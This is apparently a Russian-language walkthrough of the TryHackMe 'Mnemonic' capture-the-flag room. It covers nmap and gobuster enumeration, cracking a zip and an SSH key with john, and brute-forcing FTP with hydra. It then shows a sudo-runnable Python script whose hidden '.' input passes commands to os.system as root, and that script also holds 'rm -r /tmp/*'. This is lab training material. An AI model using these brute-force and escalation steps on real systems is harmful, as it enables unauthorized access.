# Mnemonic

:white_check_mark:  [**Hydra**](#hydra)

:white_check_mark: [**Mnemonic**](#mnemo)

___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV -p- mnemo.thm
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
|_  256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Главная страница mnemo.thm

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/1.png)

Проверим robots.txt. Можем заметить директорию **/webmasters**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/2.png)

Перейдя в эту директорию, обнаруживаем, что страница пустая.

Просканируем **/webmasters** с gobuster.
```
gobuster dir -u http://mnemo.thm/webmasters -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html
```

```
/index.html           (Status: 200) [Size: 0]
/admin                (Status: 301) [Size: 317] [--> http://mnemo.thm/webmasters/admin/]
/backups              (Status: 301) [Size: 319] [--> http://mnemo.thm/webmasters/backups/]
```

Все эти страницы оказались также пустыми. Сканируем дальше.
```
gobuster dir -u http://mnemo.thm/webmasters/admin -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html
```

```
/index.html           (Status: 200) [Size: 0]
/login.html           (Status: 200) [Size: 152]
/admin.html           (Status: 200) [Size: 948]
```

Страница **/webmasters/admin/admin.html**:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/3.png)

У нас нет никаких данных, поэтому пойдем дальше перебирать файлы.
```
gobuster dir -u http://mnemo.thm/webmasters/backups -t 100 -w /usr/share/wordlists/dirb/common.txt -x .txt,.jpg,.png,.zip
```

```
/.htaccess            (Status: 403) [Size: 274]
/.htpasswd.png        (Status: 403) [Size: 274]
/.htaccess.txt        (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/.hta                 (Status: 403) [Size: 274]
/.htaccess.jpg        (Status: 403) [Size: 274]
/.hta.txt             (Status: 403) [Size: 274]
/.htpasswd.zip        (Status: 403) [Size: 274]
/.htaccess.png        (Status: 403) [Size: 274]
/.htpasswd.txt        (Status: 403) [Size: 274]
/.hta.jpg             (Status: 403) [Size: 274]
/.htaccess.zip        (Status: 403) [Size: 274]
/.hta.png             (Status: 403) [Size: 274]
/.htpasswd.jpg        (Status: 403) [Size: 274]
/.hta.zip             (Status: 403) [Size: 274]
/backups.zip          (Status: 200) [Size: 409]
```

Мы обнаружили архив **backups.zip**. Скачаем его и посмотри содержимое.

Попробовав открыть архив, нас просят ввести пароль. Попробуем сбрутить его.
```
/usr/sbin/zip2john backups.zip > hash

john hash --wordlist=/usr/share/wordlists/rockyou.txt > hash_cracked
```

Вводим пароль и открываем архив. Получаем файл note.txt.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/4.png)

<a name="hydra"></a>

Теперь мы имеем имя пользователя для ftp. С помощью hydra сбрутим пароль для ftpuser:
```
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt mnemo.thm ftp
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/5.png)

Переходим в директорию data-4 и находим два файла: **id_rsa** и **not.txt**. Скачаем их. 

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/6.png)

Выдаем нужные права для id_rsa:
```
chmod 600 id_rsa
```

Подключаемся к машину по ssh через ключ:
```
ssh -i id_rsa james@mnemo.thm -p 1337
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/7.png)

Нас просят ввести кодовую фразу. Сбрутим id_rsa.
```
/usr/bin/ssh2john id_rsa > hash_rsa

john hash_rsa --wordlist=/usr/share/wordlists/rockyou.txt > hash_rsa_cracked
```

Вводим кодовую фразу и подкючаемся. Теперь мы можем заметить два файла.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/8.png)

Файл **6450.txt** похож на код от чего-то. Из файла **noteforjames.txt** получаем имя пользователя **condor**.

Поищем файлы с битом **SUID**:
```
find / -perm -4000 
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/9.png)

Замечаем файлы со странными названиями, это похоже на base64. Скопируем названия файлов и раскодируем.

Первый файл дает нам флаг, второй ссылку на картинку.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/10.png)

Скачаем картинку.
```
wget <Полученный url>
```

<a name="mnemo"></a>

Комната называется Mnemonic, поискав в интернете что-то похожее на это, нашел страницу с [тулзой](https://github.com/MustafaTanguner/Mnemonic). 

Скачиваем ее и используем. Вводим путь до картинки, а затем код, который мы нашли раннее.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/11.png)

## Getting
Получаем пароль от пользователя condor. За пользователя condor смотрим права: sudo -l.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/12.png)

Мы можем запускать файл examplecode от рута. Просмотрим, что находится в файле.

```
#!/usr/bin/python3
import os
import time
import sys
def text(): #text print 


        print("""

        ------------information systems script beta--------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ----------------@author villwocki------------------""")
        time.sleep(2)
        print("\nRunning...")
        time.sleep(2)
        os.system(command="clear")
        main()


def main():
        info()
        while True:
                select = int(input("\nSelect:"))

                if select == 1:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="ip a")
                        print("Main Menü press '0' ")
                        print(x)

                if select == 2:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="ifconfig")
                        print(x)

                if select == 3:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="ip route show")
                        print(x)

                if select == 4:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="cat /etc/os-release")
                        print(x)

                if select == 0: 
                        time.sleep(1)
                        ex = str(input("are you sure you want to quit ? yes : "))
                
                        if ex == ".":
                                print(os.system(input("\nRunning....")))
                        if ex == "yes " or "y":
                                sys.exit()
                      

                if select == 5:                     #root
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(2)
                        print(".......")
                        time.sleep(2)
                        print("System rebooting....")
                        time.sleep(2)
                        x = os.system(command="shutdown now")
                        print(x)

                if select == 6:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="date")
                        print(x)




                if select == 7:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="rm -r /tmp/*")
                       print(x)

                      
              


       


            

def info():                         #info print function
        print("""

        #Network Connections   [1]

        #Show İfconfig         [2]

        #Show ip route         [3]

        #Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

        #Exit                  [0]

        """)

def run(): # run function 
        text()

run()
```

Проанализировав скрипт, можно заметить, что опция **"0"** при получении **"."** позволяет использовать системные команды. Получим последний флаг.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/13.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mnemonic/14.png)
